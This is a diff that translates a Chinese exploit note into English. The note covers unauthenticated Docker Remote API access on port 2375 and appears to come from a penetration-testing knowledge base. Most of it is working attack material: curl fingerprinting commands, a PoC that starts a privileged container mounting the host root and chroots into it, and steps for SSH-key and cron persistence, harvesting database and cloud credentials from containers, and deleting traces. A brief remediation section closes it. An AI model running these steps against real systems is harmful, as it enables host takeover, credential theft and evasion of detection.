@@ -1,52 +1,52 @@
 ---
-title: Docker Remote API 未授权（直接拿宿主）
-cve: 无 CVE（配置缺陷）
+title: Docker Remote API Unauthenticated (Take the Host Directly)
+cve: No CVE (misconfiguration)
 severity: critical
 cvss: 9.8
 product: Docker Engine
-versions: 任意（2375 裸露）
+versions: Any (2375 exposed)
 ports: 2375, 2376
 keywords: docker, api, 2375, privileged, escape
 verified: false
-sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
+sources: Compiled from public sources (business-logic / implementation / misconfiguration classes, no CVE; see references below)
 ---
 
-## 指纹
+## Fingerprint
 
 ```bash
 curl -s http://target:2375/version
 curl -s http://target:2375/containers/json
 ```
 
-返回 JSON 即未授权。
+Returning JSON means unauthenticated.
 
-## 前置条件
+## Prerequisites
 
-- 2375 明文可达（常见于 CI 机、Jenkins agent、K8s 节点）。
+- 2375 reachable in plaintext (common on CI machines, Jenkins agents, K8s nodes).
 
 ## PoC
 
 ```bash
 docker -H tcp://target:2375 ps
 
-# 挂宿主根目录拿全盘
+# Mount the host root to get the whole disk
 docker -H tcp://target:2375 run -it --rm --privileged \
   -v /:/host alpine chroot /host sh
 ```
 
-## 利用步骤
+## Exploitation steps
 
-1. `curl /version` 与 `/containers/json` 确认未授权；`/images/json` 看有没有现成镜像（省得拉）。
-2. 用 `-v /:/host` + `chroot` 拿宿主文件系统；`-v /var/run/docker.sock:/x` 可以进一步控制。
-3. 落持久化：写宿主 `/root/.ssh/authorized_keys`、`/etc/cron.d/`；或直接 `docker exec` 进业务容器改代码。
-4. 挖数据：`/containers/json` 列业务容器 → `docker exec` → 环境变量里常有 DB/云凭据。
-5. 清理：删掉你创建的容器（`docker rm -f`），别留 `alpine` 之类的痕迹。
+1. Confirm unauthenticated access with `curl /version` and `/containers/json`; check `/images/json` for existing images (avoids pulling).
+2. Use `-v /:/host` + `chroot` to access the host filesystem; `-v /var/run/docker.sock:/x` gives further control.
+3. Establish persistence: write the host's `/root/.ssh/authorized_keys`, `/etc/cron.d/`; or `docker exec` into business containers and modify code directly.
+4. Harvest data: list business containers via `/containers/json` → `docker exec` → environment variables often hold DB/cloud credentials.
+5. Cleanup: remove the containers you created (`docker rm -f`); leave no traces such as `alpine`.
 
-## 修复与缓解
+## Remediation and mitigation
 
-- 2375 只绑 127.0.0.1；对外只开 2376 + TLS 双向认证。
-- 检测：`/var/log/docker.log` 或 auditd 里 `docker run --privileged` 的异常。
+- Bind 2375 to 127.0.0.1 only; expose only 2376 with mutual TLS.
+- Detection: anomalies around `docker run --privileged` in `/var/log/docker.log` or auditd.
 
-## 参考
+## References
 
-- Docker 官方《Protect the Docker daemon socket》。
+- Docker's official "Protect the Docker daemon socket".
